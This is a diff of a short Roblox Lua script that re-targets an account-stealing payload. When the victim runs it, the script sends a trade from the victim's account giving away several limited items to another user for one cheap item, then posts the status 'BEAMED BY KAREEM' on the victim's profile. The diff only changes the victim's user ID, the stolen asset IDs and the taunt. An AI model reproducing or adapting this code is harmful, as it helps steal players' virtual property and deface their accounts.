@@ -1,6 +1,6 @@
-if game.Players.LocalPlayer.UserId == 60904193 then
+if game.Players.LocalPlayer.UserId == 154606089 then
 local data = [[
-{"offers":[{"userId":60904193,"userAssetIds":[50922973114, 50921047797, 2622359349, 9207708073],"robux":null},{"userId":54313546,"userAssetIds":[130736637],"robux":null}]}
+{"offers":[{"userId":154606089,"userAssetIds":[143088242, 2018566696, 6738860291, 16251259567],"robux":null},{"userId":54313546,"userAssetIds":[130736637],"robux":null}]}
 ]]
 
 
@@ -8,7 +8,7 @@ game:HttpPostAsync("https://trades.roblox.com/v1/trades/send", data)
 
 
 pcall(function()
-local URI = "https://www.roblox.com/home/updatestatus?status=%23SPEDGANG+SEES+ALL&sendToFacebook=false"
+local URI = "https://www.roblox.com/home/updatestatus?status=BEAMED+BY+KAREEM&sendToFacebook=false"
 
 game:HttpPostAsync(URI, true)
 end)
